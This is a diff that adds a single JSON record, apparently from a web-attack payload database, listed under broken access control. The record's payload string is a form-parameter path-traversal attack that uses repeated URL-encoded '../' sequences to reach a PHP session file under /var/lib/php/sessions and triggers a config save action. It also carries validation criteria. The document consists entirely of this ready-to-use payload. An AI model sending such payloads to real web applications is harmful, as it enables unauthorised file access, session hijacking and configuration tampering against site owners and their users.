@@ -1,0 +1,13 @@
+[
+  {
+    "payload_id": "OWP-474660",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "csrf_token={CsrfValue}&functions_file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flib%2Fphp%2Fsessions%2Fsess_S1lv3r&form=array&file=config&action=save",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  }
+]
